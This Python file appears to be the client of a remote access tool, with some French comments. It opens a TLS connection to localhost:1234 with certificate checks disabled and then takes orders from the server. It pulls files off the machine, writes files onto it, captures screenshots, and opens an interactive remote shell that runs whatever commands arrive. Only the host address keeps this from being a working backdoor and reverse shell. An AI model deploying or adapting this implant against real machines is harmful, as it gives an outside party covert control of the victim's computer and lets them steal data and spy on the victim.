import socket
import ssl
import subprocess
import os


# import pyautogui


def format_filename(commande):
    file_path = commande.split(" ")[1]
    if '/' in file_path:
        return file_path.split("/")[-1], file_path
    elif '\\' in file_path:
        return file_path.split("\\")[-1], file_path
    else:
        return file_path, file_path


def upload_feature(filename, conn):
    print(f"Downloading {filename}...")

    # Recevoir la taille du fichier (8 octets)
    file_size = int.from_bytes(conn.recv(8), 'big')
    print(f"Expected file size: {file_size} bytes")

    # Recevoir le fichier en morceaux de 1024 octets
    with open(filename, "wb") as file:
        received = 0
        while received < file_size:
            chunk = conn.recv(min(1024, file_size - received))
            if not chunk:
                raise EOFError('Connection closed before receiving all the data')
            file.write(chunk)
            received += len(chunk)
            # calculate progress
            progress = str(round(((received / file_size) * 100)))
            conn.send(progress.encode('utf-8'))

    print("File uploaded successfully")
    conn.send(b"File uploaded successfully")


def download_feature(file_path, conn):
    print(f"Uploading {file_path}...")
    # Send the file size (8 bytes)
    file_size = os.path.getsize(file_path)
    conn.send(file_size.to_bytes(8, 'big'))
    print(f"Sent file size: {file_size} bytes")

    # Send the file in chunks of 1024 bytes
    with open(file_path, "rb") as file:
        while chunk := file.read(1024):
            conn.send(chunk)

    print("File uploaded successfully")
    conn.send(b"File uploaded successfully")


def connect_to_server():
    context = ssl.create_default_context()
    context.check_hostname = False  # Désactiver la vérification du nom d'hôte
    context.verify_mode = ssl.CERT_NONE  # Désactiver la vérification du certificat

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s = context.wrap_socket(s, server_hostname='localhost')  # Envelopper le socket avec SSL
    s.connect(('localhost', 1234))

    # get on which OS the client is running
    s.send(os.name.encode('utf-8'))

    while True:
        command = s.recv(1024).decode('utf-8')
        if command.lower() == "close":
            break

        # UPLOAD FILE command
        if command.lower().startswith("upload"):
            # format filename
            filename, file_path = format_filename(command.lower())

            # send the command
            upload_feature(filename, s)

        # DONWLOAD FILE command
        if command.lower().startswith("download"):
            # format filename
            filename, file_path = format_filename(command.lower())

            # send the command
            download_feature(file_path, s)

        if command.lower() == "screenshot":
            print("Taking screenshot...")
            # screenshot = pyautogui.screenshot()
            # screenshot.save("screenshot.png")
            subprocess.run(["scrot", "screenshot.png"])
            download_feature("screenshot.png", s)

        if command.lower() == "shell":
            print("Shell opened")

            while True:
                command = s.recv(1024).decode('utf-8')
                print(command)

                if command.startswith("cd"):
                    try:
                        new_path = command.split(" ")[1]
                        if not os.path.exists(new_path):
                            s.send("Directory does not exist".encode('utf-8'))
                        else:
                            os.chdir(command.split(" ")[1])
                            s.send("Directory changed".encode('utf-8'))
                    except IndexError:
                        s.send("No directory specified".encode('utf-8'))
                        continue
                    continue

                if command.lower() == "exit":
                    s.send("End of Shell.".encode('utf-8'))
                    break

                output = subprocess.getoutput(command)
                if not output:
                    output = "No output"
                s.send(output.encode('utf-8'))
        else:
            output = subprocess.getoutput(command.lower())
            s.send(output.encode('utf-8'))

    s.close()


if __name__ == "__main__":
    connect_to_server()
